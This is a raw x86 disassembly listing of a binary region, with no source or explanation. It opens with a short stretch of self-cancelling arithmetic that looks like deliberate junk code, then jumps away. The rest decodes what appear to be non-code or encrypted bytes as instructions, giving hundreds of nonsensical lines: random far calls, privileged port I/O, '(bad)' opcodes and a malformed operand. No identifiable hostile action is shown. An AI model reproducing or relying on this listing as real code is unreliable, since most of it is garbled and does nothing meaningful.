  4079fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4079fe:	sub    eax,ecx
  407a00:	mov    DWORD PTR [ebp-0xc],eax
  407a03:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  407a0a:	mov    eax,DWORD PTR [ebp-0x1c]
  407a0d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407a10:	sub    eax,ecx
  407a12:	mov    DWORD PTR [ebp-0x1c],eax
  407a15:	or     DWORD PTR [ebp-0x1c],0xf89c85d9
  407a1c:	mov    eax,DWORD PTR [ebp-0x20]
  407a1f:	mov    ecx,DWORD PTR [ebp-0x20]
  407a22:	sub    eax,ecx
  407a24:	mov    DWORD PTR [ebp-0x20],eax
  407a27:	mov    eax,DWORD PTR [ebp-0x2c]
  407a2a:	mov    ecx,DWORD PTR [ebp-0x20]
  407a2d:	mov    esi,0x7510899
  407a32:	xor    eax,esi
  407a34:	mov    edi,0x3272e0
  407a39:	add    eax,edi
  407a3b:	or     eax,ecx
  407a3d:	mov    DWORD PTR [ebp-0x20],eax
  407a40:	mov    eax,DWORD PTR [ebp-0x4]
  407a43:	mov    ecx,DWORD PTR [ebp-0x4]
  407a46:	jmp    0x409df0
  407a4b:	clc    
  407a4c:	mov    dh,0xeb
  407a4e:	cmp    DWORD PTR [ebx+0x707b9c77],0x3a37e350
  407a58:	mov    esp,0x3ca36d2f
  407a5d:	jp     0x407ad9
  407a5f:	in     eax,0x5f
  407a61:	jp     0x407add
  407a63:	pop    eax
  407a64:	xchg   edi,eax
  407a65:	std    
  407a66:	push   cs
  407a67:	daa    
  407a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a69:	ret    0x1a4c
  407a6c:	pop    ss
  407a6d:	popf   
  407a6e:	dec    edi
  407a6f:	in     al,dx
  407a70:	dec    edi
  407a71:	out    dx,eax
  407a72:	xchg   DWORD PTR [eax-0x4b876536],ebp
  407a78:	or     BYTE PTR [edi-0x45a19e30],al
  407a7e:	sub    BYTE PTR [ecx+0x67],bh
  407a81:	push   DWORD PTR [ebx-0x7711be6f]
  407a87:	call   0x7565:0x78aabe2f
  407a8e:	push   cs
  407a8f:	aad    0x70
  407a91:	sub    BYTE PTR [esi-0x1516383b],0x71
  407a98:	push   es
  407a99:	adc    bh,BYTE PTR es:[edi]
  407a9c:	clc    
  407a9d:	xlat   BYTE PTR ds:[ebx]
  407a9e:	sub    BYTE PTR [eax+0x4ef4c504],ch
  407aa4:	xor    BYTE PTR [eax],dl
  407aa6:	add    DWORD PTR [edx+0xad1cfb0],edx
  407aac:	imul   ecx,esi,0xffffffe8
  407aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ab0:	fsubr  st,st(6)
  407ab2:	lahf   
  407ab3:	cmp    al,0xb2
  407ab5:	and    BYTE PTR [ebx],al
  407ab7:	mov    ebp,0x301bd412
  407abc:	pop    edx
  407abd:	out    dx,eax
  407abe:	and    BYTE PTR [ecx+0x52],bh
  407ac1:	cmp    eax,0xdbfcc708
  407ac6:	xchg   edi,eax
  407ac7:	cmp    edi,eax
  407ac9:	mov    esp,0xac12dd77
  407ace:	pop    eax
  407acf:	adc    dl,ah
  407ad1:	dec    ecx
  407ad2:	push   0x1f
  407ad4:	mov    DWORD PTR [ebp+0x1b],ebx
  407ad7:	cs jp  0x407a9b
  407ada:	icebp  
  407adb:	cmp    BYTE PTR [edi],ah
  407add:	std    
  407ade:	ret    0xca64
  407ae1:	or     DWORD PTR [ebp+0x8],ebx
  407ae4:	dec    ecx
  407ae5:	fsubr  st(3),st
  407ae7:	lahf   
  407ae8:	and    dl,dl
  407aea:	pop    ebx
  407aeb:	into   
  407aec:	jmp    0x39e561d4
  407af1:	and    DWORD PTR [esi],esi
  407af3:	pop    esp
  407af4:	adc    eax,0xb3cfba86
  407af9:	adc    eax,0xd3a5d371
  407afe:	sub    eax,0xc41c0c87
  407b03:	adc    DWORD PTR [esp+esi*4+0x24599001],ecx
  407b0a:	ins    BYTE PTR es:[edi],dx
  407b0b:	imul   esi,DWORD PTR [edx-0x35],0x53
  407b0f:	inc    edx
  407b10:	test   DWORD PTR [edx],0xafbe2506
  407b16:	ds dec esi
  407b18:	aad    0xc1
  407b1a:	jne    0x407b5b
  407b1c:	or     eax,0xb0b0df48
  407b21:	fstp   DWORD PTR ds:0xa15b2d31
  407b27:	mov    bl,0xc
  407b29:	cmp    edx,ecx
  407b2b:	clc    
  407b2c:	jo     0x407adc
  407b2e:	scas   eax,DWORD PTR es:[edi]
  407b2f:	mov    bl,0xba
  407b31:	xor    eax,0x7f93e3f8
  407b36:	popa   
  407b37:	cmp    BYTE PTR [eax-0x6],cl
  407b3a:	jo     0x407b6b
  407b3c:	cld    
  407b3d:	das    
  407b3e:	fnstenv [ecx-0x24]
  407b41:	or     eax,DWORD PTR [ecx]
  407b43:	cmp    eax,DWORD PTR [ebx+0x429a393a]
  407b49:	sti    
  407b4a:	push   0xd7020c6a
  407b4f:	sti    
  407b50:	dec    esp
  407b51:	xor    BYTE PTR [esi-0x60],0x69
  407b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b56:	hlt    
  407b57:	in     eax,dx
  407b58:	push   edi
  407b59:	or     dh,0xd6
  407b5c:	add    ebx,DWORD PTR [ebp+0x34]
  407b5f:	in     al,0x71
  407b61:	sbb    BYTE PTR [ebx],0xf9
  407b64:	mov    BYTE PTR ds:0x212fa96e,bl
  407b6a:	inc    edi
  407b6b:	js     0x407bb7
  407b6d:	cld    
  407b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b6f:	dec    edx
  407b70:	push   eax
  407b71:	mov    cl,0xd4
  407b73:	sub    dl,0x1c
  407b76:	call   0xc56:0xee31831d
  407b7d:	scas   eax,DWORD PTR es:[edi]
  407b7e:	jmp    0x86baf4e4
  407b83:	sbb    eax,0x61ab522a
  407b88:	mov    ss,WORD PTR [ebp-0x52]
  407b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b8c:	pushf  
  407b8d:	stos   DWORD PTR es:[edi],eax
  407b8e:	mov    bh,0x87
  407b90:	in     al,0xab
  407b92:	nop
  407b93:	or     BYTE PTR [ebx+ebx*4-0x5f],al
  407b97:	loope  0x407c0c
  407b99:	cmp    dl,al
  407b9b:	arpl   bp,sp
  407b9d:	xchg   edx,eax
  407b9e:	outs   dx,BYTE PTR ds:[esi]
  407b9f:	pop    ebp
  407ba0:	popf   
  407ba1:	jge    0x407b8a
  407ba3:	jnp    0x407b2b
  407ba5:	imul   ebp,DWORD PTR [edi-0x2c4c0744],0xc601865
  407baf:	iret   
  407bb0:	icebp  
  407bb1:	int3   
  407bb2:	out    0x92,eax
  407bb4:	into   
  407bb5:	dec    eax
  407bb6:	jns    0x407c32
  407bb8:	aad    0x36
  407bba:	push   esp
  407bbb:	sbb    dh,bl
  407bbd:	in     al,dx
  407bbe:	push   edi
  407bbf:	ins    BYTE PTR es:[edi],dx
  407bc0:	push   es
  407bc1:	mov    WORD PTR [ebx+0x47],ss
  407bc4:	pop    ss
  407bc5:	add    BYTE PTR [ebp-0xfd21e2b],bh
  407bcb:	mov    ebx,0x8df60c10
  407bd0:	sbb    bl,BYTE PTR [eax]
  407bd2:	add    BYTE PTR [esi+edi*2+0x6f],al
  407bd6:	test   DWORD PTR [edi+ebp*8],ebp
  407bd9:	ror    DWORD PTR [ecx+0x31ce5f0d],cl
  407bdf:	loopne 0x407b80
  407be1:	add    eax,0x4bca3edb
  407be6:	mov    ch,0xb0
  407be8:	ss xlat BYTE PTR es:[ebx]
  407beb:	adc    al,0x31
  407bed:	sbb    BYTE PTR [eax+0x50a30d47],bh
  407bf3:	and    eax,0xa577db07
  407bf8:	out    dx,al
  407bf9:	(bad)  
  407bfa:	pop    es
  407bfb:	pusha  
  407bfc:	call   0x6537:0xab288b3c
  407c03:	pop    ebp
  407c04:	mov    ah,0xec
  407c06:	cld    
  407c07:	mov    ch,0x4f
  407c09:	mov    ch,0xc5
  407c0b:	push   0xa
  407c0d:	fwait
  407c0e:	pop    edx
  407c0f:	and    ebx,0x95ff4453
  407c15:	daa    
  407c16:	fucom  st(7)
  407c18:	stos   DWORD PTR es:[edi],eax
  407c19:	jo     0x407c17
  407c1b:	jo     0x407c74
  407c1d:	cli    
  407c1e:	mov    ds:0x410e968c,eax
  407c23:	lea    edi,[esp+edx*1-0x5dae1c0d]
  407c2a:	push   0xffffffca
  407c2c:	xchg   edx,eax
  407c2d:	es or  eax,0xc9dfac12
  407c33:	xchg   ecx,eax
  407c34:	sub    BYTE PTR ds:0xcbb99b0,0x49
  407c3b:	loopne 0x407c76
  407c3d:	pop    esi
  407c3e:	xchg   edx,eax
  407c3f:	test   eax,0x23113ef9
  407c44:	data16 (bad) 
  407c47:	inc    esp
  407c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c49:	jle    0x407cc2
  407c4b:	push   cs
  407c4c:	push   eax
  407c4d:	sub    eax,0xd03e6f4b
  407c52:	jmp    0x17be:0xb140c24c
  407c59:	stos   DWORD PTR es:[edi],eax
  407c5a:	lods   eax,DWORD PTR ds:[esi]
  407c5b:	aad    0x15
  407c5d:	shr    ebx,0xa7
  407c60:	mov    bl,0x24
  407c62:	push   ebx
  407c63:	pushf  
  407c64:	and    BYTE PTR [ebx+0x49],ah
  407c67:	inc    esp
  407c68:	mov    eax,0x32390e8d
  407c6d:	jp     0x407cd2
  407c6f:	(bad)  
  407c70:	stos   BYTE PTR es:[edi],al
  407c71:	xor    bh,ah
  407c73:	lods   eax,DWORD PTR ds:[esi]
  407c74:	ds add DWORD PTR ds:[eax],edi
  407c78:	in     eax,0x3d
  407c7a:	outs   dx,DWORD PTR ds:[esi]
  407c7b:	and    al,ah
  407c7d:	push   esp
  407c7e:	pop    ebx
  407c7f:	outs   dx,DWORD PTR ds:[esi]
  407c80:	mov    dh,0xd0
  407c82:	(bad)  
  407c83:	(bad)  
  407c84:	(bad)  
  407c86:	ins    DWORD PTR es:[edi],dx
  407c87:	cmp    bh,BYTE PTR [eax]
  407c89:	inc    ebp
  407c8a:	fisubr WORD PTR [esi-0x22a845f1]
  407c90:	cmp    BYTE PTR [ebx-0x47],dh
  407c93:	jbe    0x407cde
  407c95:	push   esp
  407c96:	and    al,0x62
  407c98:	sbb    al,0x6b
  407c9a:	lods   al,BYTE PTR ds:[esi]
  407c9b:	sub    BYTE PTR [ebp-0x65],ch
  407c9e:	std    
  407c9f:	mov    ds:0xa2386fca,al
  407ca4:	dec    eax
  407ca5:	lock adc eax,0x75acdc8b
  407cab:	adc    esp,DWORD PTR [ebp-0x16]
  407cae:	dec    ecx
  407caf:	in     eax,dx
  407cb0:	call   0xe5752320
  407cb5:	push   ebx
  407cb6:	pop    ebx
  407cb7:	xor    BYTE PTR [ebx+0x70e4444d],al
  407cbd:	data16 sub al,0xf0
  407cc0:	lods   eax,DWORD PTR ds:[esi]
  407cc1:	test   ebp,ebp
  407cc3:	dec    ecx
  407cc4:	fldenv [ecx]
  407cc6:	jle    0x407c48
  407cc8:	pusha  
  407cc9:	push   0x69
  407ccb:	nop
  407ccc:	stc    
  407ccd:	inc    ebx
  407cce:	fisub  WORD PTR [edx-0x639d9052]
  407cd4:	or     al,0x5c
  407cd6:	inc    edx
  407cd7:	in     eax,dx
  407cd8:	mov    bh,0x54
  407cda:	in     eax,0x3a
  407cdc:	fdivr  DWORD PTR [ecx]
  407cde:	jne    0x407cf3
  407ce0:	mov    WORD PTR [ecx+esi*2],gs
  407ce3:	test   BYTE PTR [edx],0xbe
  407ce6:	or     esi,ebx
  407ce8:	pop    ds
  407ce9:	add    eax,0xabb0e34e
  407cee:	add    al,0xd0
  407cf0:	stos   DWORD PTR es:[edi],eax
  407cf1:	mov    ebx,ebx
  407cf3:	jns    0x407d2a
  407cf5:	pop    esp
  407cf6:	cdq    
  407cf7:	iret   
  407cf8:	out    dx,al
  407cf9:	pop    ss
  407cfa:	ror    DWORD PTR [esi],0x55
  407cfd:	pop    edi
  407cfe:	sbb    DWORD PTR [ebp-0x4a],edi
  407d01:	jle    0x407d4a
  407d03:	jmp    0x407cc4
  407d05:	mov    edi,0x916c0c76
  407d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d0b:	loopne 0x407cf9
  407d0d:	repnz push cs
  407d0f:	xchg   edi,eax
  407d10:	das    
  407d11:	iret   
  407d12:	outs   dx,DWORD PTR ds:[esi]
  407d13:	clc    
  407d14:	or     esi,eax
  407d16:	enter  0xb99a,0xad
  407d1a:	lds    ebx,FWORD PTR fs:[edx*8-0x6af57095]
  407d22:	inc    ebx
  407d23:	dec    edx
  407d24:	out    dx,al
  407d25:	daa    
  407d26:	adc    DWORD PTR ds:0x35a2246f,eax
  407d2c:	dec    ebx
  407d2d:	xor    al,0xe5
  407d2f:	aad    0x1b
  407d31:	bound  esp,QWORD PTR [edi-0x15]
  407d34:	adc    ebx,DWORD PTR [eax+0x21]
  407d37:	(bad)
  407d3b:	jg     0x407cd8
  407d3d:	std    
  407d3e:	dec    ecx
  407d3f:	sbb    ah,BYTE PTR [edi-0x25ce5886]
  407d45:	test   BYTE PTR [eax],bh
  407d47:	xor    eax,0xaa168170
  407d4c:	jp     0x407d90
  407d4e:	xchg   edx,eax
  407d4f:	push   0xf7cfeda3
  407d54:	dec    ebp
  407d55:	fistp  QWORD PTR [bx+si+0x13da]
  407d5a:	mov    dl,0x26
  407d5c:	cmp    al,0x66
  407d5e:	pop    eax
  407d5f:	push   esp
  407d60:	adc    eax,0x392bacad
  407d65:	push   ebx
  407d66:	mov    ecx,0x63a40e06
  407d6b:	inc    edi
  407d6c:	dec    eax
  407d6d:	mov    ebp,0x3f839f9c
  407d72:	xchg   ebp,eax
  407d73:	daa    
  407d74:	fpatan 
  407d76:	adc    eax,DWORD PTR ds:0x41e70c4b
  407d7c:	gs retf 0xbd08
  407d80:	(bad)  
  407d81:	fld    TBYTE PTR [eax]
  407d83:	jecxz  0x407d55
  407d85:	inc    ecx
  407d86:	xchg   esp,eax
  407d87:	mov    ch,0xd4
  407d89:	call   0xc86b4b0f
  407d8e:	mov    esi,0x8d0be7b9
  407d93:	in     eax,0xba
  407d95:	mov    edx,0x7aa24cae
  407d9a:	div    DWORD PTR ds:0xac84b6b0
  407da0:	push   edx
  407da1:	stc    
  407da2:	cmp    al,bl
  407da4:	xchg   esp,eax
  407da5:	xchg   ecx,eax
  407da6:	shr    DWORD PTR [ebx-0x5d],1
  407da9:	sti    
  407daa:	jmp    0xc62b:0xf91321d8
  407db1:	adc    dh,BYTE PTR [ecx+ebx*8+0x225e3b57]
  407db8:	fwait
  407db9:	mov    ch,0xbd
  407dbb:	(bad)  
  407dbd:	jmp    0x221:0xe2d57fe0
  407dc4:	sub    ch,BYTE PTR [ecx+eiz*8+0x0]
  407dc8:	call   0x470af448
  407dcd:	and    edi,DWORD PTR [ebp+0x78]
  407dd0:	daa    
  407dd1:	sub    al,0x78
  407dd3:	jp     0x407d63
  407dd5:	mov    dl,0xbb
  407dd7:	or     ebp,DWORD PTR [ebp-0x119d5132]
  407ddd:	test   BYTE PTR [edx+0x5e],0x29
  407de1:	(bad)  
  407de2:	mov    esi,0x704e908f
  407de7:	fst    DWORD PTR [esi]
  407de9:	shl    BYTE PTR [ebx+0x30],1
  407dec:	lock inc ebx
  407dee:	pusha  
  407def:	xchg   DWORD PTR [edi-0x52],ecx
  407df2:	pusha  
  407df3:	mov    ah,BYTE PTR [ebx-0x4690a977]
  407df9:	adc    DWORD PTR [ebx+0x54],0x3
  407dfd:	imul   ebx,DWORD PTR [ebx+ecx*8+0x2f422fe7],0xfffffff1
  407e05:	pop    ebx
  407e06:	sbb    DWORD PTR [eax-0x1af1291b],ebx
  407e0c:	adc    edx,edx
  407e0e:	div    bl
  407e10:	ret    
  407e11:	sbb    DWORD PTR [edx],ebp
  407e13:	sbb    edi,ebx
  407e15:	jp     0x407e32
  407e17:	das    
  407e18:	hlt    
  407e19:	ins    BYTE PTR es:[edi],dx
  407e1a:	arpl   WORD PTR [ebp+0x3b],di
  407e1d:	and    bh,BYTE PTR [ecx]
  407e1f:	mov    DWORD PTR [ebp-0x39],ebp
  407e22:	pushf  
  407e23:	(bad)  
  407e24:	sub    eax,0x6b3069a7
  407e29:	in     eax,dx
  407e2a:	lods   al,BYTE PTR ds:[esi]
  407e2b:	popf   
  407e2c:	stos   BYTE PTR es:[edi],al
  407e2d:	imul   esp,DWORD PTR [edi+0x7d],0x41
  407e31:	loope  0x407eaa
  407e33:	push   esp
  407e34:	ins    BYTE PTR es:[edi],dx
  407e35:	shr    DWORD PTR ds:0xaada26d8,cl
  407e3b:	adc    edi,DWORD PTR [ecx-0x5a00bf19]
  407e41:	mov    ds:0x77a3ae0d,eax
  407e46:	push   esp
  407e47:	push   ebp
  407e48:	cli    
  407e49:	sti    
  407e4a:	rcl    DWORD PTR [edx+0x2c],0x9f
  407e4e:	push   edi
  407e4f:	sti    
  407e50:	fwait
  407e51:	jmp    0x2838:0x361e35a3
  407e58:	fidiv  DWORD PTR [eax+0x39]
  407e5b:	xchg   DWORD PTR [edi+0x621cab35],ebx
  407e61:	je     0x407ee0
  407e63:	pop    esi
  407e64:	mov    ebx,0xa41f645f
  407e69:	call   0x85b0af9c
  407e6e:	loope  0x407e50
  407e70:	stos   BYTE PTR es:[edi],al
  407e71:	pop    edx
  407e72:	lock lahf 
  407e74:	jmp    0x3c6f3cd1
  407e79:	push   ebp
  407e7a:	add    esp,DWORD PTR [esi+ecx*2]
  407e7d:	lods   eax,DWORD PTR ds:[esi]
  407e7e:	push   edi
  407e7f:	sti    
  407e80:	push   ss
  407e81:	or     edi,DWORD PTR [esi+0x6d0a8c35]
  407e87:	jb     0x407efe
  407e89:	xchg   esp,eax
  407e8a:	test   BYTE PTR [ebp-0x64e4acab],0xba
  407e91:	dec    eax
  407e92:	sub    DWORD PTR [edi+esi*4],eax
  407e95:	fbld   TBYTE PTR [ebx]
  407e97:	mov    ds:0xedddfafd,al
  407e9c:	push   eax
  407e9d:	leave  
  407e9e:	mov    esi,0xad9c0899
  407ea3:	xor    BYTE PTR [ebp+0x781b879b],ch
  407ea9:	sahf   
  407eaa:	jecxz  0x407eb4
  407eac:	in     eax,0x11
  407eae:	jne    0x407ee5
  407eb0:	fs (bad) 
  407eb2:	in     eax,dx
  407eb3:	pop    esi
  407eb4:	in     eax,0x49
  407eb6:	dec    edi
  407eb7:	push   ss
  407eb8:	xor    al,al
  407eba:	test   cl,bh
  407ebc:	test   al,0x79
  407ebe:	ret    0xa7af
  407ec1:	ficomp WORD PTR [ebp-0x2e263040]
  407ec7:	and    al,0x43
  407ec9:	outs   dx,BYTE PTR ds:[esi]
  407eca:	mov    ds:0x6ec56267,eax
  407ecf:	adc    al,0x66
  407ed1:	std    
  407ed2:	popf   
  407ed3:	pop    esi
  407ed4:	mov    dl,0x17
  407ed6:	lahf   
  407ed7:	cld    
  407ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed9:	jns    0x407ec7
  407edb:	ret    0x8b72
  407ede:	add    eax,0xbbd7b680
  407ee3:	sar    BYTE PTR [ebx],cl
  407ee5:	pop    edx
  407ee6:	imul   DWORD PTR [ecx+0xe]
  407ee9:	stc    
  407eea:	mov    edx,0x80f4f761
  407eef:	lahf   
  407ef0:	addr16 push cs
  407ef2:	in     al,dx
  407ef3:	mov    edi,0x826188f7
  407ef8:	ret    0x4067
  407efb:	mov    ebx,0x875c7317
  407f00:	xor    edi,ebx
  407f02:	rol    DWORD PTR [ebx+esi*8],1
  407f05:	fwait
  407f06:	pop    ds
  407f07:	or     BYTE PTR [edx],bl
  407f09:	xlat   BYTE PTR cs:[ebx]
  407f0b:	mov    BYTE PTR [ecx+0x46],ch
  407f0e:	pop    edx
  407f0f:	pop    ds
  407f10:	mov    ebp,0x3b8293df
  407f15:	imul   ecx,ebp,0x6c3d563f
  407f1b:	lds    ecx,FWORD PTR [eax+0x34682c5a]
  407f21:	btr    DWORD PTR [edi-0x7ddd543a],0x3b
  407f29:	xchg   edx,eax
  407f2a:	or     eax,0x7262fe4a
  407f2f:	mov    ah,0x37
  407f31:	push   esi
  407f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f33:	in     eax,0xf6
  407f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f36:	pop    ds
  407f37:	test   al,0x7b
  407f39:	in     al,0x2e
  407f3b:	icebp  
  407f3c:	pop    eax
  407f3d:	mov    bh,BYTE PTR [esi+0x273b63d3]
  407f43:	inc    ecx
  407f44:	mov    eax,esp
  407f46:	cwde   
  407f47:	daa    
  407f48:	test   DWORD PTR [eax+0x51],eax
  407f4b:	or     DWORD PTR [ebp-0x9],0x41001662
  407f52:	test   BYTE PTR [eax-0x332c8c3],0x6f
  407f59:	sub    esi,DWORD PTR [eax+0x34]
  407f5c:	into   
  407f5d:	adc    edi,DWORD PTR [eax-0x4b]
  407f60:	neg    BYTE PTR [edi+0x4e]
  407f63:	cwde   
  407f64:	sub    cl,BYTE PTR [ecx+0x1a]
  407f67:	jne    0x407fb2
  407f69:	pop    ds
  407f6a:	test   al,0x9e
  407f6c:	into   
  407f6d:	push   0x750ffd7a
  407f72:	inc    eax
  407f73:	xchg   ebx,eax
  407f74:	retf   
  407f75:	sub    dh,BYTE PTR [eax+0x1ff5e014]
  407f7b:	push   ds
  407f7c:	ins    BYTE PTR es:[edi],dx
  407f7d:	add    eax,0x919249cf
  407f82:	fstp   QWORD PTR [edx]
  407f84:	xchg   ecx,eax
  407f85:	nop
  407f86:	out    dx,al
  407f87:	pop    edx
  407f88:	daa    
  407f89:	iret   
  407f8a:	mov    bh,0xf8
  407f8c:	pushf  
  407f8d:	in     eax,dx
  407f8e:	rcr    DWORD PTR [eax+0x6a8a58f0],cl
  407f94:	sub    cl,cl
  407f96:	aam    0xb3
  407f98:	dec    edi
  407f99:	adc    DWORD PTR [edi+0x37],esp
  407f9c:	mov    eax,cs:0xff7d885f
  407fa2:	inc    edx
  407fa3:	inc    esp
  407fa4:	data16 cld 
  407fa6:	std    
  407fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa8:	(bad)  
  407fa9:	pop    esp
  407faa:	int3   
  407fab:	(bad)  
  407fac:	xchg   ebp,eax
  407fad:	sub    DWORD PTR [edx-0x2992686f],0xffffffe5
  407fb4:	mov    bh,0x55
  407fb6:	mov    dl,0x23
  407fb8:	nop
  407fb9:	or     DWORD PTR [ebx-0xbba70b2],0xede8550
  407fc3:	mov    eax,gs
  407fc5:	hlt    
  407fc6:	ds daa 
  407fc8:	lods   al,BYTE PTR ds:[esi]
  407fc9:	dec    ecx
  407fca:	or     eax,0x5baf59ce
  407fcf:	fs mov ch,0xae
  407fd2:	aaa    
  407fd3:	(bad)  
  407fd4:	push   0xa623c83c
  407fd9:	(bad)  
  407fda:	mov    al,0x57
  407fdc:	inc    esp
  407fdd:	dec    ecx
  407fde:	iret   
  407fdf:	mov    edx,0x5ac727f6
  407fe4:	repz cmp cl,BYTE PTR [eax]
  407fe7:	sub    ah,BYTE PTR [edx+0x73706fe2]
  407fed:	push   0x38
  407fef:	enter  0x5f7d,0xf0
  407ff3:	and    BYTE PTR [edx],ch
  407ff5:	call   0x18d8:0xbdace487
  407ffc:	adc    ecx,ebp
  407ffe:	rcr    BYTE PTR [ebx+0x5b704c68],cl
  408004:	mov    ah,0x16
  408006:	stc    
  408007:	push   edi
  408008:	das    
  408009:	or     al,0xa9
  40800b:	mov    edx,ebp
  40800d:	adc    DWORD PTR [esi-0x10da86ae],esp
  408013:	sub    DWORD PTR [ebp+0x69],edx
  408016:	pop    es
  408017:	stc    
  408018:	or     BYTE PTR [ebx],al
  40801a:	je     0x408029
  40801c:	jp     0x408057
  40801e:	ja     0x408051
  408020:	(bad)  
  408022:	div    BYTE PTR [ecx+0x34]
  408025:	jp     0x407fbd
  408027:	sti    
  408028:	sbb    eax,0x6f14b313
  40802d:	popa   
  40802e:	mov    BYTE PTR [edi],0x9f
  408031:	jo     0x408026
  408033:	test   al,0xf0
  408035:	sbb    DWORD PTR [ebp-0x80],0x1c
  408039:	ror    BYTE PTR [edi-0x6c836183],1
  40803f:	jge    0x407ffb
  408041:	sub    eax,0x773e2d1
  408046:	xchg   edx,eax
  408047:	das    
  408048:	pop    ss
  408049:	mov    ch,0xa4
  40804b:	mov    al,ds:0x9e9234f3
  408050:	arpl   WORD PTR [ecx+0x171e290c],bp
  408056:	and    al,0xd2
  408058:	jp     0x407fdf
  40805a:	rcl    eax,1
  40805c:	mov    ?,WORD PTR [ecx+0x27]
  40805f:	xor    al,0xc2
  408061:	mov    bh,0xbe
  408063:	pop    esi
  408064:	mov    cl,0xee
  408066:	cmc    
  408067:	inc    edx
  408068:	inc    ecx
  408069:	popa   
  40806a:	push   esi
  40806b:	lahf   
  40806c:	popa   
  40806d:	lahf   
  40806e:	jmp    0xfa6b:0x158a9d41
  408075:	das    
  408076:	imul   eax,DWORD PTR [ecx+0x10146cd9],0x6c
  40807d:	fnstenv [eax]
  40807f:	xchg   edx,eax
  408080:	adc    dl,BYTE PTR [edi-0x6a]
  408083:	mov    cl,0xe8
  408085:	mov    cl,0x91
  408087:	daa    
  408088:	ss push 0x46
  40808b:	pop    es
  40808c:	xor    al,0x67
  40808e:	push   es
  40808f:	lock (bad) 
  408091:	jge    0x40807b
  408093:	aaa    
  408094:	pop    es
  408095:	or     dl,BYTE PTR [eax+ebp*8]
  408098:	add    eax,0xde15b8b
  40809d:	out    dx,eax
  40809e:	hlt    
  40809f:	call   0x36c1:0xf5f49ccc
  4080a6:	jno    0x4080f1
  4080a8:	dec    edi
  4080a9:	dec    esp
  4080aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ab:	mov    ebp,eax
  4080ad:	mov    es,WORD PTR [eax-0x1d659bbf]
  4080b3:	clc    
  4080b4:	xor    DWORD PTR ds:0x9271ced0,ebx
  4080ba:	xor    esp,ebx
  4080bc:	call   esi
  4080be:	jg     0x4080f7
  4080c0:	add    BYTE PTR [edx],dl
  4080c2:	push   esp
  4080c3:	call   0x344e8417
  4080c8:	mov    ebx,0xa9d6553e
  4080cd:	fwait
  4080ce:	sbb    BYTE PTR [edx],bh
  4080d0:	mov    dh,0x4f
  4080d2:	dec    ebp
  4080d3:	mov    WORD PTR [esi+0x35d93dae],fs
  4080d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080da:	jp     0x4080fb
  4080dc:	cmp    al,0x60
  4080de:	fdivr  QWORD PTR [edi-0x13]
  4080e1:	inc    bp
  4080e3:	imul   ecx,DWORD PTR ds:0xa4e1196f,0x8232b465
  4080ed:	adc    eax,ecx
  4080ef:	add    edi,eax
  4080f1:	push   eax
  4080f2:	push   ss
  4080f3:	add    al,BYTE PTR [ecx+0x51]
  4080f6:	dec    edi
  4080f7:	mov    cl,0x56
  4080f9:	jmp    0x510c14fa
  4080fe:	pop    eax
  4080ff:	cmp    ch,BYTE PTR [edi]
  408101:	sbb    BYTE PTR [ebp+0x13],bl
  408104:	sub    DWORD PTR gs:[edi*4-0x3b9f6bf0],esp
  40810c:	push   0xadbd85b1
  408111:	or     DWORD PTR [ebp+0x50],0x90c72650
  408118:	jmp    0x1c3f5919
  40811d:	mov    eax,ds:0x7508ff68
  408122:	dec    esi
  408124:	dec    eax
  408125:	(bad)  
  408126:	lock mov ds:0xe94bca64,al
  40812c:	mov    eax,0x3dd03db9
  408131:	ror    DWORD PTR [ebp-0x1d],1
  408134:	xchg   esp,eax
  408135:	les    eax,FWORD PTR [ebx-0x61]
  408138:	add    al,0x5
  40813a:	(bad)  
  40813b:	in     eax,dx
  40813c:	sahf   
  40813d:	push   ss
  40813e:	sbb    dh,cl
  408140:	das    
  408141:	sub    eax,0x1666b242
  408146:	pushf  
  408147:	retf   0x418e
  40814a:	jnp    0x4080fd
  40814c:	push   esp
  40814d:	mov    esp,0x40b19e56
  408152:	je     0x4081a6
  408154:	popf   
  408155:	popa   
  408156:	enter  0x38d9,0x5b
  40815a:	sub    ebp,DWORD PTR fs:[edi+0x59]
  40815e:	adc    al,0xfe
  408160:	in     al,dx
  408161:	add    DWORD PTR [esi+0x17f2aafb],ecx
  408167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408168:	jle    0x408193
  40816a:	cmp    eax,0x29fde960
  40816f:	xchg   esp,eax
  408170:	xor    BYTE PTR ds:0x4522ebbb,0xd1
  408177:	fist   WORD PTR [edi+edx*4]
  40817a:	cld    
  40817b:	jg     0x408183
  40817d:	sbb    ah,BYTE PTR [edx-0x62]
  408180:	test   dh,ah
  408182:	cmc    
  408183:	rcr    al,0xab
  408186:	jmp    0x4081df
  408188:	push   cs
  408189:	add    eax,0xaecb7d4c
  40818e:	push   0xe4df6a43
  408193:	fisubr DWORD PTR [eax+eiz*4+0x450f7bae]
  40819a:	(bad)  
  40819b:	fdiv   st,st(4)
  40819d:	push   0xcb45619b
  4081a2:	lock dec edx
  4081a4:	scas   eax,DWORD PTR es:[edi]
  4081a5:	popf   
  4081a6:	mov    ebx,0xc08eefa8
  4081ab:	lods   eax,DWORD PTR ds:[esi]
  4081ac:	sub    BYTE PTR ds:0x98db2ab2,ch
  4081b2:	call   0x1a917cdd
  4081b7:	mov    bl,0x6d
  4081b9:	aam    0x0
  4081bb:	(bad)  
  4081bc:	scas   al,BYTE PTR es:[edi]
  4081bd:	loope  0x408196
  4081bf:	mov    bh,0x6a
  4081c1:	nop
  4081c2:	mov    eax,ds:0x12a890eb
  4081c7:	aad    0xb2
  4081c9:	int3   
